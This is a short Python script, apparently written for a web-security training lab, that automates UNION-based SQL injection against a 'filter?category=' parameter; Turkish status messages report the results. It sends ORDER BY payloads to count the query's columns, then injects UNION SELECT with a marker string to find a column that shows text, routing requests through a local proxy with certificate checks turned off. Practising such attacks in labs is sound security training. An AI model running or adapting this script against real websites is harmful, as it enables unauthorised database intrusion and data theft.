import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def exploit_sqli(url):
    path="filter?category=Gifts"
    for i in range(1,10):
        sql_payload= "'+order+by+%s--"%i
        r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
        res = r.text
        if"Internal Server Error" in res:
            return i -1
    return False

def exploit_sqli_str(url, num_col):
    path = "filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'6IAQN6'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False




if __name__ == "__main__":
    try:
        url =sys.argv[1].strip()
    except IndexError:
        print("[-] Usage:  %s <url> <payload>"% sys.argv[0])
        print('[-] For Example :  %s www.random.com ' % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Sutun sayısı arıyor : ")
    num_col = exploit_sqli(url)
    
    if num_col:
        print("[+] SQL INJECTION BULUNDU" + str(num_col) + "   <---")
        print("[+] union test : ")
        string_column = exploit_sqli_str(url,num_col)
        if string_column:
             print("[+] SQL INJECTION BULUNDU: union text" + str(string_column) + "   <---")
        else:
            print("[-] SQL INJECTION UNION BULUNAMADI")

    else:
        print("[-] SQL INJECTION BULUNAMADI")


